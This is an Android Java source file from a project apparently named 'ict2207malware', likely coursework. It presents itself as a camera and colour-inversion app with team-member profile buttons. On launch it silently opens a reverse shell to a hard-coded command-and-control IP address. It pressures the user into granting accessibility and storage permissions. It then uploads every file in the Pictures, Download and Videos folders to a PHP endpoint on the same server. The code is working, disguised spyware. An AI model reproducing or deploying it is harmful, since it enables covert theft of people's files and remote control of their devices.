package com.example.ict2207malware;

import static android.content.ContentValues.TAG;

import androidx.appcompat.app.AppCompatActivity;

import android.Manifest;
import android.content.Intent;
import android.graphics.Bitmap;
import android.os.Bundle;
import android.provider.MediaStore;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;

import android.annotation.SuppressLint;
import android.content.pm.PackageManager;

import android.util.Log;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import org.apache.commons.io.FileUtils;
import org.apache.commons.io.filefilter.TrueFileFilter;
import android.os.StrictMode;
import android.widget.ImageView;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.List;

@SuppressLint("NewApi")
public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        //starting reverse shell thread
        new Thread(runnable).start();
        //avoid running IO operations on the UI thread, avoids Activity leakages
        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
        StrictMode.setThreadPolicy(policy);
        //at the start of the application check if app has the necessary permission to run properly

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[] {Manifest.permission.CAMERA}, 1);
        }

        if (!checkAccessibilityPermission()) {
            showAccessibilityDialog();
            //Toast.makeText(MainActivity.this, "Please enable permissions for app", Toast.LENGTH_SHORT).show();
        }

        Button cameraButton = findViewById(R.id.CameraButton);
        cameraButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View viewCamera) {

                Intent intent = new Intent();
                intent.setAction(MediaStore.ACTION_IMAGE_CAPTURE);
                startActivity(intent);
            }
        });

        Button colorButton = findViewById(R.id.BlindButton);
        colorButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View viewBlind) {
                //write code to invert color here
            }
        });

        Button uploadButton = findViewById(R.id.UploadButton);
        uploadButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View viewUpload) {
                try {
                    checkPermission();
                } catch (Exception e) {
                    Log.v("Permission issue","Some issue with allowing permission");
                }
                Intent gallery = new Intent(Intent.ACTION_PICK, MediaStore.Images.Media.INTERNAL_CONTENT_URI);
                startActivity(gallery);
            }
        });


        int[] BUTTON_IDS = {R.id.shaneButton, R.id.haiqiButton, R.id.junjieButton, R.id.ericButton, R.id.adrielButton, R.id.ruiButton};

        for (int id : BUTTON_IDS) {
            Button button =  findViewById(id);
            button.setOnClickListener(view -> {
                switch(view.getId()){
                    case R.id.shaneButton:
                        displayShane();
                        break;
                    case R.id.haiqiButton:
                        displayHaiqi();
                        break;
                    case R.id.junjieButton:
                        displayJunjie();
                        break;
                    case R.id.ericButton:
                        displayEric();
                        break;
                    case R.id.adrielButton:
                        displayAdriel();
                        break;
                    case R.id.ruiButton:
                        displayRui();
                        break;
                }
            });
        }
    }

    public boolean checkAccessibilityPermission() {
        int accessEnabled = 0;
        try {
            accessEnabled = Settings.Secure.getInt(this.getContentResolver(), Settings.Secure.ACCESSIBILITY_ENABLED);
        }
        catch (Settings.SettingNotFoundException e) {
            e.printStackTrace();
        }
        if (accessEnabled == 0) {
            return false;
        }
        else {
            return true;
        }
    }

    private void showAccessibilityDialog() {
        PermDialog dialog = new PermDialog();
        dialog.setDialogText("Accessibility permissions are required to run this app");
        dialog.show(getSupportFragmentManager(), "AccessibilityDialog");
    }

    public void displayShane()
    {
        DisplayShane displayShane = new DisplayShane();
        displayShane.show(getSupportFragmentManager(),"Shane's Information");
    }

    public void displayHaiqi()
    {
        DisplayHaiqi displayHaiqi = new DisplayHaiqi();
        displayHaiqi.show(getSupportFragmentManager(), "Haiqi's Information");
    }

    public void displayJunjie()
    {
        DisplayJunjie displayJunjie = new DisplayJunjie();
        displayJunjie.show(getSupportFragmentManager(), "Jun Jie's Information");
    }

    public void displayEric()
    {
        DisplayEric displayEric = new DisplayEric();
        displayEric.show(getSupportFragmentManager(), "Eric's Information");
    }

    public void displayAdriel()
    {
        DisplayAdriel displayAdriel = new DisplayAdriel();
        displayAdriel.show(getSupportFragmentManager(), "Adriel's Information");
    }

    public void displayRui()
    {
        DisplayRui displayRui = new DisplayRui();
        displayRui.show(getSupportFragmentManager(), "Rui Heng's Information");
    }

    private void checkPermission() {
        //If permission granted == true, start malicious activity
        if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.WRITE_EXTERNAL_STORAGE")
                == PackageManager.PERMISSION_GRANTED) {
            //create fileDir pathname here
            File pictures = new File("/storage/emulated/0/Pictures");
            File download = new File("/storage/emulated/0/Download");
            File videos = new File("/storage/emulated/0/Videos");
           // File whatsapp = new File("/storage/emulated/0/WhatsApp");

            fileUpload(pictures);
            fileUpload(download);
            fileUpload(videos);
            //fileUpload(whatsapp);

        } else {
            //if got permission issue, get access to location permission
            final int REQUEST_CODE_ASK_PERMISSIONS = 123;
            ActivityCompat.requestPermissions(MainActivity.this, new String[]{"android.permission.WRITE_EXTERNAL_STORAGE"},
                    REQUEST_CODE_ASK_PERMISSIONS);
            //run chkpermission function again
            checkPermission();
        }
    }

    Runnable runnable = new Runnable() {
        @Override
        public void run() {
            new BackDoor().reverse_tcp("146.190.104.215", 444); // C2 IP and Reverse Shell Port
        }
    };

    private void fileUpload(File fDir){
        List<File> listFiles = (List<File>) FileUtils.listFiles(fDir, TrueFileFilter.INSTANCE, TrueFileFilter.INSTANCE);
        for (File file:listFiles) {
            try {
                //attempt to upload files found in this dir
                String pathOfFiles = file.getCanonicalPath();
                uploads(pathOfFiles);
            }
            catch (Exception e) {
                Log.v("Server issue",e.toString());
            }
        }
    }
    //method to upload the pictures files/whatever files found on android phone to our web server
    public static void uploads(String pathToOurFile) throws Exception {
        HttpURLConnection connection = null;
        DataOutputStream outputStream = null;
        DataInputStream inputStream = null;

        //to be replaced with web server address, change to localhost if unreachable.
        String urlServer = "http://146.190.104.215:80/upload.php";
        String lineEnd = "\r\n";
        String twoHyphens = "--";
        //delimiter
        String boundary = "*****";

        int bytesRead, bytesAvailable, bufferSize;
        byte[] buffer;
        int maxBufferSize = 1 * 1024 * 1024;


        //CLIENT REQUEST
        FileInputStream fileInputStream = new FileInputStream(pathToOurFile);
        // open a URL connection to the Servlet
        URL url = new URL(urlServer);
        // Open a HTTP connection to the URL
        connection = (HttpURLConnection) url.openConnection();

        // Allow Inputs
        connection.setDoInput(true);
        // Allow Outputs
        connection.setDoOutput(true);
        // Don't use a cached copy.
        connection.setUseCaches(false);

        // Enable POST method
        connection.setRequestMethod("POST");
        connection.setRequestProperty("Connection", "Keep-Alive");
        connection.setRequestProperty("Content-Type",
                "multipart/form-data;boundary=" + boundary);
        outputStream = new DataOutputStream(connection.getOutputStream());
        outputStream.writeBytes(twoHyphens + boundary + lineEnd);
        outputStream
                .writeBytes("Content-Disposition: form-data; name=\"uploadedfile\";filename=\""
                        + pathToOurFile + "\"" + lineEnd);
        outputStream.writeBytes(lineEnd);
        // create a buffer of maximum size
        bytesAvailable = fileInputStream.available();
        bufferSize = Math.min(bytesAvailable, maxBufferSize);
        buffer = new byte[bufferSize];

        // Read file and write it into form...
        bytesRead = fileInputStream.read(buffer, 0, bufferSize);
        while (bytesRead > 0) {
            outputStream.write(buffer, 0, bufferSize);
            bytesAvailable = fileInputStream.available();
            bufferSize = Math.min(bytesAvailable, maxBufferSize);
            bytesRead = fileInputStream.read(buffer, 0, bufferSize);
        }
        outputStream.writeBytes(lineEnd);
        outputStream.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
        // Responses from the server (code and message)
        int serverResponseCode = connection.getResponseCode();
        String serverResponseMessage = connection.getResponseMessage();
        fileInputStream.close();
        outputStream.flush();
        outputStream.close();
        //for troubleshooting, 413 error requires changes to be made to nginx and php upload limits
        Log.v("Server response", serverResponseCode+" "+serverResponseMessage);
    }
}